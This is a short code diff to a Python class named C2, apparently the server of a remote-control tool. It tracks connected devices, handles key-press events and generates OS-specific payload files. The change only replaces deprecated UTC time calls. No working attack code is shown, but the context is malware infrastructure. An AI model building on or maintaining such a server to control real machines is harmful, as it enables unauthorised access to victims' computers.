@@ -65,7 +65,7 @@ class C2:
         self.sio.on("key_press", self.key_press)
         self.sio.on("key_press_short", self.key_press_short)
 
-        print(f"Current time: {datetime.datetime.utcnow()}")
+        print(f"Current time: {datetime.datetime.now(tz=datetime.timezone.utc)}")
 
         self.update_json()
 
@@ -141,7 +141,7 @@ class C2:
             if sid == self.devices[device]["sid"]:
                 data = self.devices[device]
                 self.devices.pop(device)
-                data['last_online'] = datetime.datetime.utcnow().strftime("%Y-%m-%d-%H-%M-%S")
+                data['last_online'] = datetime.datetime.now(tz=datetime.timezone.utc).strftime("%Y-%m-%d-%H-%M-%S")
                 self.total_devices.update({data["uid"]: data})
                 self.update_json()
                 break
@@ -245,7 +245,7 @@ class C2:
         if not os.path.isdir("payloads"):
             os.makedirs("payloads")
 
-        date = datetime.datetime.utcnow().strftime("%Y-%m-%d-%H-%M-%S")
+        date = datetime.datetime.now(tz=datetime.timezone.utc).strftime("%Y-%m-%d-%H-%M-%S")
         payload_file_name = f"payload_{os_name}_{arch}_{date}_{uuid.uuid4()}"
 
         requ_numpy="1.24.4"
